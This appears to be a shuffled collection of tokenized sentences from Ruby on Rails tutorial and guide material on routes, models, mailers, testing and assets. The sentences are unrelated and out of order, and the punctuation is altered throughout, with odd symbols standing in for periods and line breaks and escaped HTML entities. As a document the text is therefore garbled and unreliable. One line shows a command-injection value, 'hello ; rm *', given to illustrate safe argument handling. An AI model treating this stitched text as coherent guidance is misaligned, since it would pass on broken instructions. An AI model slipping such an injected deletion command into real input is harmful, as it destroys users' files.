With the addition of the status feed , we &apos;ve finished the core sample application for the \ emph { Ruby on Rails Tutorial } .
When a partial is called with a pluralized collection , then the individual instances of the partial have access to the member of the collection being rendered via a variable named after the partial ▖
To make the effects of \ kode { image \ _ tag } clearer , let &apos;s look at the HTML it produces
Mailers work very similarly to controllers ▖
These default to :
We &apos;ve properly separated our concerns , making future ╼ change easy ▖
This code uses \ kode { respond \ _ to } to take the appropriate action depending on the kind of request .
One way to find the proper abstraction is to consider how we might implement the act of \ emph { following } in a web application .
once the string is interpolated .
patch / users / 17 ?
Templates within a basic Rails application like this are kept in a single ╼ location , but in more complex applications it could be many different paths .
If you want to be explicit , you can use the ` : template` option ( which was required on Rails 2 ▖ 2 and earlier ) :
If you can &apos;t see the \ kode { ▖ gitignore } file in your directory , you may need to configure your directory viewer to show hidden files .
# See &quot; Following users &quot; for the full implementation .
# # # # MultiJSON removal
There are several places we could put the resulting \ kode { digest } method , but we &apos;ll have an opportunity in Section ~ \ ref { sec : remember _ token } to reuse \ kode { digest } in the User model .
head : bad _ request
These results will vary based on the version of Ruby you are using .
That said , the distinction ╼ generally just affects which release your patch will get in to ; we love feature ╼ submissions !
This is a much less specific assertion than \ kode { assert \ _ select } ; in particular , unlike \ kode { assert \ _ select } , using \ kode { assert \ _ match } in this context doesn &apos;t require us to indicate which HTML tag we &apos;re looking for .
The \ texttt { bcrypt-ruby } library uses a \ emph { cost factor } to control how computationally costly it is to create the secure hash .
Without this , there is a possibility that the engine &apos;s components could &quot; leak &quot; ╼ into the application , causing unwanted disruption , or that important engine ╼ components could be overridden by similarly named things within the application ▖ ╼
You can see more about the events &#91; in the jquery-ujs wiki &#93; ( https : / / github ▖ com / rails / jquery-ujs / wiki / ajax ) .
* How to create layouts with multiple content sections .
To retrieve records from the database in a specific order , you can use the `order` method .
Here we &apos;ve factored out the common text for the submit button using the \ kode { let } method to define a \ kode { submit } variable .
te } ╼ ╼ % subsection rails _ environments ( end ) ╼ ╼ \ subsection { A Users resource } % ( fold ) ╼ \ label { sec : a _ users _ resource } ╼ ╼
By convention , Rails assumes that the column used to hold the primary key of the association is `id` ▖
When this happens it should be discussed over a PR on a case-by-case basis and never committed directly to docrails .
In the above image , the bottom line has been truncated ▖
@ assemblies = @ part ▖ assemblies
It &apos;s worth noting that the \ kode { nil } object is special , in that it is the \ emph { only } Ruby object that is false in a boolean context , apart from \ kode { false } itself :
We &apos;ll develop the sample app using a combination of \ emph { mockups } , \ emph { test-driven development } ( TDD ) , and \ emph { integration tests } .
Note that the URL is \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ; as you might suspect , the number ~ \ kode { 1 } is simply the user &apos;s ~ \ kode { id } attribute from Figure ~ \ ref { fig : demo _ user _ model } .
389 ▖ 32314 ▖ to _ s ( : rounded , precision : 0 ) # = &gt; 389
The Home page with HTML structure removed ▖
Consider , for example , the \ texttt { email } attribute created by the migration in Listing ~ \ ref { code : users _ migration } .
If the CDN has stale or bad content , then it is ╼ hurting rather than helping your application ▖
* `config ▖ eager _ load _ paths` accepts an array of paths from which Rails will eager load on boot if cache classes is enabled ▖
WARNING : Automatic deletion of join models is direct , no destroy callbacks are triggered .
For now , let &apos;s turn to the ╼ built-in validation helpers that Rails provides by default .
You can now wrap the `git` calls in an `after _ bundle` block ▖
respond _ to : html , : json
Signup failure .
Our original user doesn &apos;t suffer from loneliness any more , but now we have the opposite problem : our user has \ emph { too many } companions , and they all appear on the same page .
It also gives us URL helpers as follows :
&quot; production &quot; ▖ inquiry ▖ production ?
orders ▖ delete ( object , ▖ ▖ ▖ )
In addition to the `valid ? ` and `invalid ? ` methods covered earlier , Rails provides a number of methods for working with the `errors` collection and inquiring about the validity of objects .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
* Removes a &quot; _ id &quot; suffix if present .
} ▖ freeze
Many Rails developers use a \ kode { shared } directory for partials shared across different views .
prev _ month ( last _ month )
Incorporating \ kode { assert \ _ difference } into the file from Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } yields the test shown in Listing ~ \ ref { code : a _ test _ for _ valid _ submission } .
In the context of pure RSpec , there is a solution , which is to use a \ emph { custom matcher } , allowing us to write the following instead :
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 ▖ rc1 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
This helper validates that the specified attributes are absent ▖
For example , the dependencies mechanism uses them :
Since both pages will be showing data , we use \ kode { get } to arrange for the URLs to respond to \ texttt { GET } requests ( as required by the REST convention for such pages ) , and the \ kode { member } method means that the routes respond to URLs containing the user id .
( Turbolinks will be described in more detail in a future draft of this book ▖ )
This method is not tolerant to non-existing dates , if the change is invalid `ArgumentError` is raised :
If the command above returns an error like ``Could not find &apos; railties &apos; &apos; &apos; , it means you don ’ t have the right version of Rails installed , and you should double-check that you followed the command in Listing ~ \ ref { code : installing _ rails } exactly as written .
Having a good test suite is an invaluable tool in this regard , as it dramatically lowers the probability of introducing bugs while refactoring .
As a result , any strategies for verifying requests from non-rails forms that relied on a static session CSRF token have to take this into account .
This updates the database at Heroku with the necessary user and micropost data models .
`pluralize` can also take an optional `count` parameter ▖
We start with the page to show all the users in our application , called \ href { http : / / localhost : 3000 / users } { \ texttt { index } } ; as you might expect , initially there are no users at all ( Figure ~ \ ref { fig : demo _ blank _ user _ index _ rails _ 3 } ) .
Seeing exactly how this plays out is the task for the rest of this tutorial .
With that command we told Rails that we want a `Article` model , together ╼ with a _ title _ attribute of type string , and a _ text _ attribute ╼ of type text ▖
╼ $ bundle exec rake db : migrate VERSION = 0
if requirement ▖ multiline ?
You can pass either an Active Record object or a collection of objects ▖
Resulting in something a little shorter , and more implicit in its behavior ▖
NOTE : Defined in `active _ support / core _ ext / object / instance _ variables ▖ rb` .
You can use the ` : only` and ` : except` options to fine-tune this behavior ▖
Note in particular that \ kode { admin } is \ emph { not } in the list of permitted attributes .
class BooksController &lt; ApplicationController
Rails environments
config ▖ action _ dispatch ▖ default _ headers = {
Once users can sign up , we &apos;ll let them log in and log out as well ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) , and in Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } ( Section ~ \ ref { sec : requiring _ logged _ in _ users } ) we &apos;ll learn how to protect pages from improper access .
If you have both `config / database ▖ yml` and `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` set then Rails will merge the configuration together ▖
If it fails , we simply fall back on the behavior developed in Section ~ \ ref { sec : unsuccessful _ signups } .
If no ordering clause is specified in the query , the `reverse _ order` orders by the primary key in reverse order .
Note in particular the use of the \ kode { have \ _ xpath } method , which is an advanced and powerful technique that uses \ href { http : / / en ▖ wikipedia ▖ org / wiki / XPath } { XPath } to navigate XML documents ( including HTML5 ) .
With the code in Section ~ \ ref { sec : destroying _ microposts } , the Micropost model and interface are complete .
In the present case , we want the given code \ emph { not } to change the count , which we express using the \ kode { not \ _ to } method .
* How to create your own custom validation methods .
By convention , Rails assumes that the column used to hold the foreign key on the other model is the name of this model with the suffix ` _ id` added ▖
* `toggle !
Please use American English ( * color * , * center * , * modularize * , etc ) ▖
You can continue after the code example and you can attach issue number ▖
The second syntax replaces the symbol / hashrocket combination with the name of the key followed by a colon and a value :
We include \ kode { row } and \ kode { col-md-4 } classes , which are both part of Bootstrap .
body : email _ body ,
No tests .
╼ * = require _ tree .
The model file , `app / models / article ▖ rb` is about as simple as it can get :
Updated tests for the Home page &apos;s title .
This section explains how to add and / or override engine MVC functionality in the ╼ main Rails application .
def derive _ class _ name
The \ href { http : / / railscasts ▖ com / episodes / 87-generating-rss-feeds } { RailsCast on generating RSS feeds } will help get you started .
sys 0m1 ▖ 068s
# config ▖ action _ mailer ▖ sendmail _ settings = {
It &apos;s important to understand that TDD is not always the right tool for the job : there &apos;s no reason to dogmatically insist that tests always should be written first , that they should cover every single feature , or that there should necessarily be any tests at all .
The Microposts controller \ kode { destroy } action .
NOTE : Defined in `active _ support / core _ ext / class / attribute ▖ rb`
# = &gt; ActiveModel : : StrictValidationFailed : Name can &apos;t be blank
# # # # # `collection ▖ create ( attributes = { } ) `
A signed-in user with new links and a dropdown menu ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ with _ signout _ link _ bootstrap-full ▖ png } { ( full size ) }
In Reader , you can right-click on the document and select ``Previous View &apos; &apos; to go back .
as shown in Listing ~ \ ref { code : remember _ me _ css } .
TIP : You don &apos;t need to call `to _ json` on the object that you want to render ▖
token
Making the \ kode { content } attribute ( and \ emph { only } the \ kode { content } attribute ) accessible .
No overrides .
( If you &apos;re working on your local machine instead of the cloud IDE , you can also use \ kode { heroku open } ▖ )
The old defaults in the test ╼ environment are : `config ▖ assets ▖ compile = true` , `config ▖ assets ▖ compress = false` , ╼ `config ▖ assets ▖ debug = false` and `config ▖ assets ▖ digest = false` .
On most systems , you can also use Ctrl-D for the same purpose ▖ )
We end our discussion of the demo application with a brief description of the controller and model class hierarchies in Rails .
In Rails 5 , the default log level for the production environment will be changed ╼ to ` : debug` ( from ` : info` ) ▖
Along the way , we &apos;ll build on our work in Section ~ \ ref { sec : layout _ link _ tests } to write succinct and expressive integration tests .
in Listing ~ \ ref { code : home _ view _ erb _ title } .
Or , in English : &quot; return all articles that have a comment made by a guest ▖ &quot;
In Preview , use the Go menu : \ texttt { Go &gt; Back } .
The methods `silence _ warnings` and `enable _ warnings` change the value of ` $ VERBOSE` accordingly for the duration of their block , and reset it afterwards :
Using an RSpec shared example to eliminate test duplication .
Tags that follow this form are known as \ emph { self-closing } tags .
Rails on Rack
The first thing that the scaffold generator does is invoke the `active _ record` ╼ generator , which generates a migration and a model for the resource ▖
In this case we are setting the ` : from` header to a value for all ╼ messages in this class ▖
} % &gt; &lt; / td &gt;
This does not destroy the associated objects .
We then cover the two cases of password match and mismatch :
In other words , if a non-logged-in user tries to visit the edit page , after logging in the user will be redirected to / users / 1 instead of / users / 1 / edit .
This is how you run the Active Record test suite only for SQLite3 :
# # # # # ` : inverse _ of`
An integration test for the micropost interface ▖
# arguments : &apos; -i -t&apos;
A console will also be provided on any error page you view in your development environment .
# # # CsrfHelper
at least one letter
You may recall from Section ~ \ ref { sec : a _ user _ class } that we have already encountered , via a custom-built \ kode { User } class , user objects with \ kode { name } and \ kode { email } attributes .
invoke test _ unit
The relationships between these classes is illustrated in Figure ~ \ ref { fig : demo _ controller _ inheritance } .
Add an email address verification step to confirm a user &apos;s signup .
Safe arguments are directly appended :
* `render : html` will set the content type to `text / html`
# # # # options _ for _ select
Because you want to create a new HTML form , you will be using the `ERB` ╼ language ▖
* `having`
&lt; option value = &quot; 3 &quot; selected = &quot; selected &quot; &gt; China &lt; / option &gt;
To activate the root route , uncomment this line by removing the hash character and then replace it with the code in Listing ~ \ ref { code : hello _ root _ route } , which tells Rails to send the root route to the \ kode { hello } action in the Application controller .
As you might guess from the working page , at this point the corresponding test should also pass :
Password reminders
First , run these two commands :
As with models and controllers , we can generate a mailer using \ kode { rails generate } :
For example , you can return only an error header :
For example , ` &quot; SSLError &quot; ▖ underscore ▖ camelize` gives back ` &quot; SslError &quot; ` .
{ &quot; development &quot; = &gt; { &quot; adapter &quot; = &gt; &quot; sqlite3 &quot; , &quot; database &quot; = &gt; &quot; NOT _ my _ database &quot; } }
If you must support non-JavaScript-enabled browsers you can fake a \ texttt { DELETE } request using a form and a \ texttt { POST } request , which works even without JavaScript
render status : : forbidden
config ▖ assets ▖ cache _ store = : memory _ store , { size : 32 ▖ megabytes }
&lt; % = form _ for &#91; : update _ name , @ user &#93; , method : : put do &#124; f &#124; % &gt;
In this case , Rails will use the customer or employee partials as appropriate for each member of the collection .
This is the same authorization model used by Twitter .
You can also use the ternary operator to replace assignment :
The \ kode { where } method can be used to perform Active Record selections .
% w ( 1 2 3 4 5 6 7 ) ▖ in _ groups ( 3 ) { &#124; group &#124; p group }
* `config ▖ action _ controller ▖ perform _ caching` configures whether the application should perform caching or not ▖
╼ Get help on the Ruby on Rails Tutorial at the
The `exists ? ` method also takes multiple values , but the catch is that it will return `true` if any ╼ one of those records exists .
* `ActionDispatch : : Session : : CookieStore` is responsible for storing the session in cookies ▖
# # # # # ` : validate`
The result appears as in Listing ~ \ ref { code : relationships _ controller _ ajax } .
For instance `ActionController : : UrlRewriter` defines
root to : &quot; admin # index &quot;
# # # Running an Application Against Your Local Branch
This method may be useful for example to build specialized conversions ▖
Rails also provides several ways to more precisely assign specific layouts to individual controllers and actions .
Helping to Resolve Existing Issues
= &gt; &quot; 42 , 8 , 17 , 7 , foo , bar &quot;
In Chapter ~ \ ref { cha : sign _ in _ sign _ out } , we &apos;ll use the \ kode { authenticate } method to sign registered users into our site .
This \ kode { index } action has the line \ kode { @ users = User ▖ all } ( Step ~ 3 in Figure ~ \ ref { fig : mvc _ detailed } ) , which asks the User model to retrieve a list of all the users from the database ( Step ~ 4 ) , and then places them in the variable \ kode { @ users } ( pronounced ``at-users &apos; &apos; ) ( Step ~ 5 ) .
xml ▖ tag ! ( &quot;
I &apos;ve kept the \ kode { : source } key to emphasize the parallel structure with the \ kode { has \ _ many : followed \ _ users } association , but you are free to leave it off .
You can see which files are in the staging area using the \ kode { status } command :
----------------------------------
Since users can &apos;t yet sign up for the sample application through the web---that &apos;s the goal of Chapter ~ \ ref { cha : sign _ up } ---we &apos;ll use the Rails console to create a new user by hand .
By using the full URL , your links will now work in your emails .
The default value is &quot; alternate &quot; .
date ▖ beginning _ of _ hour # = &gt; Mon Jun 07 19 : 00 : 00 + 0200 2010
By following the example of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } , add a second action called \ kode { goodbye } that renders the text ``goodbye , world ! &apos; &apos; .
prev _ week ( last _ week )
Library assets such as cascading style sheets ( CSS ) , JavaScript files , and images
The result appears in Listing ~ \ ref { code : test _ helper _ digest }
Here we &apos;ve taken care to run the test suite before deploying , which is a good habit to develop .
# # # `rewhere`
* `config ▖ assets ▖ prefix` defines the prefix where assets are served from ▖
That ╼ prevents artificial constructs like ` ! ! ` or ternaries , allows refactors , and the ╼ code does not need to rely on the exact values returned by methods being called ╼ in the implementation .
As discussed in more depth in Section ~ \ ref { sec : comments _ for _ various _ readers } , web development is a challenging subject , especially for complete beginners .
Right now there are a hundred , which is already a reasonably large number , and on a real site it could be thousands .
# # # Command Line Injection
( Thanks to \ href { http : / / alexchaffee ▖ com / } { Alex Chaffee } for the suggestion and code used in this exercise ▖ )
ExpiresActive On
Explore and document edge cases ▖
Creates a dropdown selection box .
in Listing ~ \ ref { code : remember _ method } .
# ▖ ▖ .
Testing for the \ kode { user ▖ relationships } attribute .
&lt; % = audio _ tag &quot; music ▖ mp3 &quot; % &gt;
* ` : minimum` - The attribute cannot have less than the specified length .
The improved \ kode { README } file formatted with Markdown ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / new _ readme _ 4 _ 0-full ▖ png } { ( full size ) }
There may be times when you wish to customize the query used by `has _ one` ▖
Group
In the process of putting the new links into the layout , we &apos;ll take advantage of Bootstrap &apos;s ability to make dropdown menus , which you can read more about on the \ href { http : / / twitter ▖ github ▖ com / bootstrap / components ▖ html } { Bootstrap components page } .
In older versions of Rails , using this raw SQL used to be the only option to get the desired behavior , but as of Rails ~ 4 ▖ 0 we can use a more natural pure-Ruby syntax as well :
&lt; td &gt; Hello World !
Most of their students start with limited programming experience but have the determination and drive needed to pick it up quickly .
In designing a data model , you will sometimes find a model that should have a relation to itself ▖
With that , our test suite should be \ passing :
╼ end
This means that it will be an unescaped variable directly from a user who may have malicious intent ▖
Google `` &lt; your browser name &gt; inspect cookies &apos; &apos; to learn how to inspect the cookies on your system .
The uniqueness caveat
It iterates through the collection and passes each element to a block ▖
puts &apos; baz&apos;
as shown in Listing ~ \ ref { code : application _ whitelist } .
/ help
Run Command-Shift-R to verify that the test or test group is red .
The name of the scaffold follows the convention of \ emph { models } , which are singular , rather than resources and controllers , which are plural .
Here we could write
The scaffold code may have extra newlines compared to Listing ~ \ ref { code : demo _ microposts _ resource } .
And a bang version `reverse _ merge ! ` that performs the merge in place :
&quot; Product &quot; ▖ underscore # = &gt; &quot; product &quot;
( This comment-out technique is also useful when rescuing an application whose application code is already written but--- \ href { http : / / en ▖ wiktionary ▖ org / wiki / quelle _ horreur } { \ emph { quelle horreur ! } } ---has no tests ▖ )
# * &lt; tt &gt; : allow _ nil &lt; / tt &gt; - Skip validation if attribute is + nil + .
After you &apos;ve assembled your assets , Rails prepares them for the site template by running them through several preprocessing engines and using the manifest files to combine them for delivery to the browser .
Note also that the following / follower counts are calculated through the associations using
Getting through the entire book usually takes \ emph { much } longer than three days .
&lt; % = javascript _ include _ tag &quot; main &quot; , &quot; / photos / columns &quot; % &gt;
scope ( path _ names : { new : &apos; neu &apos; , edit : &apos; bearbeiten &apos; } ) do
The SQL generated by this method looks like this :
NoMethodError : undefined method `palindrome ? &apos;
╼ ╼ % subsection ssl _ in _ production ( end ) ╼ ╼ \ subsection { Production webserver } % ( fold ) ╼ \ label { sec : production _ webserver } ╼ ╼
&#91; See some examples of scrubbers here &#93; ( https : / / github ▖ com / flavorjones / loofah # loofahscrubber ) .
But the problem lies within the total number of queries executed ▖
NOTE : Defined in `active _ support / core _ ext / hash / indifferent _ access ▖ rb` .
The answer is that it is possible to tell whether a user is new or already exists in the database via Active Record &apos;s \ kode { new \ _ record ? } \ boolean method :
Ruby Enterprise Edition has these fixed since the release of 1 ▖ 8 ▖ 7-2010 ▖ 02 ▖
# = &gt; &lt; input id = &quot; dob &quot; name = &quot; dob &quot; type = &quot; date &quot; / &gt;
* * Adding * * `Article # time _ since _ created` and * * Overriding * * `Article # summary` :
# # # # Updating pull request
This means that there are methods in Rails with `public` visibility that aren &apos;t meant for user consumption .
redirect _ to : back
Unlike the Capybara \ kode { page } object , \ kode { response } lets us test for the server response itself , in this case verifying that the \ kode { update } action responds by redirecting to the signin page :
A test for the rejection of duplicate email addresses ▖
The correspondence between pages and URLs for the Users resource .
So the real question should have been , ``Can a site built with Rails scale ? &apos; &apos;
Default is ` : number` .
Use of the Rails ``default stack &apos; &apos; , including the built-in MiniTest testing framework
&lt; % = link _ to &apos; welcome &apos; , welcome _ path % &gt;
More commonly for dynamic sites , the controller interacts with a \ emph { model } , which is a Ruby object that represents an element of the site ( such as a user ) and is in charge of communicating with the database .
&lt; div id = &quot; error _ explanation &quot; &gt;
creates seven different routes in your application , all mapping to the `Photos` controller :
&lt; % if @ part ▖ assemblies ▖ empty ?
The Microposts controller itself appears in schematic form Listing ~ \ ref { code : demo _ microposts _ controller } .
As required , the test initially fails :
If , despite the challenges involved , you would still prefer to complete the \ emph { Ruby on Rails Tutorial } using a local development environment , I recommend following the instructions at \ href { http : / / installrails ▖ com / } { InstallRails ▖ com }
By the way , we &apos;re now in a position to understand the line of Ruby I threw into Section ~ \ ref { sec : heroku _ commands } to generate random subdomains :
dup &#91; 1 &#93; &#91; 2 &#93; = 4
INNER JOIN orders ON clients ▖ id = orders ▖ client _ id
The tests should now pass :
For finer-grained control , set this to false and implement `local _ request ? ` in controllers to specify which requests should provide debugging information on errors .
Ruby on Rails is a web development framework written in the Ruby programming language .
&quot; Ruby on Rails Tutorial Sample App &#124; Home &quot;
# # # # # `beginning _ of _ minute` , `end _ of _ minute`
@ part ▖ assemblies ▖ destroy ( @ assembly1 )
Adding some typographic styling .
* Perform database operations in an object-oriented fashion .
As shown in Listing ~ \ ref { code : home _ root _ route } , this means replacing the generated \ kode { get } rule from Listing ~ \ ref { code : pages _ routes } with the following code :
This is due to the `isolate _ namespace` method called in ╼ the `Blorgh : : Engine` class &apos;s definition ▖
Here the regex \ kode { VALID \ _ EMAIL \ _ REGEX } is a \ emph { constant } , indicated in Ruby by a name starting with a capital letter .
n this step ( Box ~ \ ref { aside : technical _ sophistication } ) ▖ ) ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-df67d8 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection changing _ the _ layout _ links ( end ) ╼ ╼ \ subsection { Testing layout changes } % ( fold ) ╼ \ label { sec : testing _ layout _ changes } ╼ ╼
module ActiveSupport
If you want to disable Turbolinks for certain links , add a `data-no-turbolink` ╼ attribute to the tag :
The annotated User model .
In the case of a URL like / users / 1 , the value of \ kode { params &#91; : id &#93; } is the \ kode { id } of the corresponding user ( \ kode { 1 } ~ in this example ) .
Unlike most introductions to the command line , which typically assume a relatively high level of technical sophistication , \ emph { Learn Enough Command Line to Be Dangerous } assumes no prerequisites other than general computer knowledge ( how to launch an application , how to use a web browser , how to \ href { http : / / lmgtfy ▖ com / ? q = learn + to + touch + type } { touch type } , etc ▖ ) .
The method `seconds _ since _ midnight` returns the number of seconds since midnight :
A user is signed in if there is a current user in the session , i ▖ e ▖ , if \ kode { current \ _ user } is non- \ kode { nil } .
get &apos; preview &apos; , on : : member
Technical sophistication
# action _ controller / metal / session _ management ▖ rb
in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } .
Unlike plain JavaScript files , JS-ERb files also allow the use of embedded Ruby , which we apply in the \ kode { create ▖ js ▖ erb } file to update the follow form with the \ kode { unfollow } partial ( which is what should show after a successful following ) and update the follower count .
# # # # check _ box
Here we &apos;ve introduced Capybara &apos;s \ kode { have \ _ link } method .
require &quot; blorgh / engine &quot;
Once you have resolved all conflicts and made sure all the tests are passing , push your changes and open a separate pull request for your backport ▖
render inline : &quot; xml ▖ p { &apos; Horrid coding practice ! &apos; } &quot; , type : : builder
The console allows us to define methods the same way we did with the \ kode { home } action from Listing ~ \ ref { code : static _ pages _ controller } or the \ kode { full \ _ title } helper from Listing ~ \ ref { code : title _ helper } .
In this chapter , we &apos;ll rely on the User model validations from Chapter ~ \ ref { cha : modeling _ users } to increase the odds of new users having valid email addresses .
The resulting data model appears in Figure ~ \ ref { fig : user _ model _ admin } .
But if you do want to rename your application , you can arrange for it to be reasonably secure by using a random or obscure subdomain , such as the following :
Defaults to ` / usr / sbin / sendmail` ▖ &lt; / li &gt;
HTML changes with time ; by explicitly making a doctype declaration we make it likelier that browsers will render our pages properly in the future .
The action &apos; about &apos; could not be found for StaticPagesController
Push to your remote :
If you want to add a fix to older versions of Ruby on Rails , you &apos;ll need to set up and switch to your own local tracking branch ▖
In practice , the URL is usually equivalent to ``the thing you see in the address bar of your browser &apos; &apos; .
We do this by first updating our test with the code in Listing ~ \ ref { code : home _ base _ title _ spec } , which updates the previous title test and adds one to test for the absence of the custom \ kode { &quot; Home &quot; } string in the title .
You can supply a hash of additional HTML options :
The fragments prefixed with a star are called &quot; wildcard segments &quot; .
By default , Active Record uses some naming conventions to find out how the ╼ mapping between models and database tables should be created ▖
This creates `comments` as a _ nested resource _ within `articles` ▖
They inherit from ╼ `ActionMailer : : Base` and live in `app / mailers` , and they have associated views ╼ that appear in `app / views` .
invoke erb
# active _ record / reflection ▖ rb
def acts _ like _ string ?
umerate } ╼ ╼ % subsection a _ working _ follow _ button _ the _ standard _ way ( end ) ╼ ╼ \ subsection { A working follow button with Ajax } % ( fold ) ╼ \ label { sec : a _ working _ follow _ button _ with _ ajax } ╼ ╼
# = &gt; &lt; input type = &quot; email &quot; id = &quot; user _ email &quot; name = &quot; user &#91; email &#93; &quot; value = &quot; # { @ user ▖ email } &quot; / &gt;
Validations are not covered on this guide , but let &apos;s assume for a moment that you temporarily add
# prints &quot; hello ; rm * &quot; and does not delete files
When a method gets called on the class itself , as in the case of \ kode { new } , it &apos;s called a \ emph { class method } .
As shown in Listing ~ \ ref { code : ssl _ in _ production } , all we need to do is set the \ kode { config } variable to force the use of SSL in production .
At this point , the test suite should be back to \ passing :
Although in the actual application we will immediately sign in a newly created user ( thus creating a new remember token as a side-effect ) , we don &apos;t want to rely on this behavior ; a more robust practice is to ensure that \ emph { every } user has a valid remember token right from the start .
config ▖ assets ▖ prefix = &quot; / dev-assets &quot;
C ▖ new ( 0 , 1 ) ▖ instance _ values # = &gt; { &quot; x &quot; = &gt; 0 , &quot; y &quot; = &gt; 1 }
( This is a bit advanced , so don &apos;t worry too much about the details ▖ )
This makes the \ kode { str } argument optional , and if we leave it off it automatically takes the given default value .
require &apos; yet _ another _ engine / engine&apos;
config ▖ action _ dispatch ▖ perform _ deep _ munge = false
It would be even better if you could include a unit test that shows how the expected behavior is not occurring ▖
config ▖ action _ controller ▖ asset _ host = &quot; assets ▖ example ▖ com &quot;
User ▖ find _ each do &#124; user &#124;
After restarting the development server to activate the configuration in Listing ~ \ ref { code : development _ email _ settings } , we next need to update the User mailer \ emph { preview file } , which was automatically generated in Section ~ \ ref { sec : account _ activations _ resource } , as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
The CDN you provisioned should give you a custom subdomain for your application ╼ such as `mycdnsubdomain ▖ fictional-cdn ▖ com` ( note fictional-cdn ▖ com is not a ╼ valid CDN provider at the time of this writing ) ▖
For example , consider these models :
&lt; table &gt;
Data accessible to the public ( e ▖ g ▖ , web browsers ) , such as error pages
We won &apos;t be using the \ kode { example \ _ user ▖ rb } file from Section ~ \ ref { sec : a _ user _ class } , so I suggest removing it :
The User model itself appears in Listing ~ \ ref { code : demo _ user _ model } ; although it is rather plain , it comes equipped with a large amount of functionality because of inheritance ( Section ~ \ ref { sec : inheritance _ hierarchies } and Section ~ \ ref { sec : ruby _ classes } ) .
In this section , we &apos;ll learn about some Ruby data structures important for writing Rails applications .
name ▖ dasherize : name
Paths are traversed in the order they occur in the search path ▖
The inheritance hierarchy for the StaticPages controller .
Tests for the user index page .
&#124; PATCH / PUT &#124; / photos / : id &#124; photos # update &#124; image _ path ( : id ) &#124;
( where \ kode { self } refers to the current user ) , but inside the User model the \ kode { self } keyword is optional on the right-hand side :
The linear narrative is such a great format .
* Checks for IP spoofing attacks .
gem &apos; rails-deprecated _ sanitizer&apos;
* Rails 4 ▖ 0 has deprecated `ActiveRecord : : TestCase` in favor of `ActiveSupport : : TestCase` .
* ` : greater _ than _ or _ equal _ to` - Specifies the value must be greater than or ╼ equal to the supplied value ▖
In some applications , this initial implementation might be good enough for most practical purposes , but Listing ~ \ ref { code : from _ users _ followed _ by _ first _ cut } isn &apos;t the final implementation ; see if you can make a guess about why not before moving on to the next section .
As long as `Sprockets` responds to `call` and returns a ` &#91; status , headers , body &#93; ` , the router won &apos;t know the difference between the Rack application and an action ▖
The tests ( Listing ~ \ ref { code : relationship _ validation _ tests } ) and application code ( Listing ~ \ ref { code : relationship _ validations } ) are straightforward .
host = config &#91; : host &#93; ▖ presence &#124; &#124; &apos; localhost&apos;
# Rails ▖ root / config ▖ ru
# # # `to _ query`
In addition to being a clever phrase--- \ emph { new relic } being a contradiction in terms---New Relic is also an anagram for the name of the company &apos;s founder , Lew Cirne .
You can supply alternate text for the image which will be used if the user has images turned off in their browser ▖
The method `local _ constants` returns the names of the constants that have been ╼ defined in the receiver module :
As with the User scaffold , the scaffold generator for microposts follows the singular convention of Rails models ; thus , we have \ kode { generate Micropost } .
Sending email via the user model object .
We &apos;ll be resizing images using the image manipulation program \ href { http : / / www ▖ imagemagick ▖ org / } { ImageMagick } , which we need to install on the development environment .
All calculation methods work directly on a model :
# # # # # `collection ▖ find ( ▖ ▖ ▖ )
hash &#91; : b &#93; &#91; : e &#93; = = nil # = &gt; true
`Relation` no longer has mutator methods like ` # map ! ` and ` # delete _ if` ▖
This will work fine , because both the `Supplier` and the `Account` class are defined within the same scope ▖
address : company ▖ smtp _ host }
All we need to do is save the user ( so it gets an id ) and create an associated micropost .
flash ▖ keys # = &gt; &#91; &quot; string &quot; , : symbol &#93;
See the \ href { http : / / getbootstrap ▖ com / components / } { Bootstrap components page } for more information .
create app
The second test first sets the user &apos;s name to an invalid ( blank ) value , and then tests to see that the resulting \ kode { @ user } object is invalid :
After clicking ``Create repository &apos; &apos; , follow the instructions under ``Command line &gt; I have an existing project &apos; &apos; , which should look something like Listing ~ \ ref { code : bitbucket _ add _ push } .
In this context , \ kode { params &#91; : session &#93; &#91; : remember \ _ me &#93; } is either \ kode { &apos; 0&apos; } or \ kode { &apos; 1&apos; } , both of which are \ kode { true } in a boolean context , so the resulting expression is \ emph { always true } , and the application acts as if the checkbox is always checked .
A test for user logging in with valid information ▖
# = &gt; false
Returns the followed user
= &gt; true
Part of this issue relied on a misconception ; \ href { http : / / idleprocess ▖ wordpress ▖ com / 2009 / 11 / 24 / presentation-summary-high-performance-at-massive-scale-lessons-learned-at-facebook / } { you scale a \ emph { site } , not a framework } , and Rails , as awesome as it is , is only a framework .
If you want to assign an object to a `has _ many` association without saving the object , use the `collection ▖ build` method .
The error page for a valid signup submission .
The only exception is in Section ~ \ ref { sec : scopes _ subselects _ and _ a _ lambda } .
Indeed , much of the elegance of Rails ultimately derives from the malleability of the underlying Ruby language .
A test to catch unwanted flash persistence ▖
As usual , we can express the requirement for \ kode { authenticate } using RSpec .
In this example , the `articles _ path` helper is passed to the ` : url` option .
&#124; POST &#124; / photos &#124; photos # create &#124; create a new photo &#124;
= &gt; &quot; The string is nonempty &quot;
= &gt; &quot; Newlines ( \ \ n ) and tabs ( \ \ t ) both use the backslash character \ \ ▖ &quot;
( Because the argument refers to the remember token , it is not uncommon to use a method argument that has the same name ▖ )
Explaining Rack is not really in the scope of this guide ▖
In Chapter ~ \ ref { cha : a _ toy _ app } , we &apos;ll make a second project , whose purpose is to demonstrate the basic workings of a Rails application .
The \ kode { update } action for password reset .
